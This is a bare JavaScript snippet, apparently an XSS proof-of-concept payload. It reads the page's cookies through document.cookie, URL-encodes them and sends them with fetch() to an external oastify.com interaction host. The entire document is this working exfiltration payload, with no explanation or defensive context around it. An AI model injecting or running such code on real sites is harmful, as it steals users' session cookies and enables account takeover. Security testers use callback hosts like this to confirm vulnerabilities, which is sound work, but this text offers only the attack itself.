const targetUrl = 'http://ji5rd84htpbadospi5salpyvimodcb00.oastify.com';
const urlWithParams = `${targetUrl}?cookieData=${encodeURIComponent(document.cookie)}`;

fetch(urlWithParams, {
  method: 'POST', // Specify the method
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    message: 'Logging cookie data via URL parameter'
  })
})
.then(response => {
  if (response.ok) {
    console.log('Request sent successfully');
  } else {
    console.error('Request failed');
  }
})
.catch(error => console.error('Error:', error));
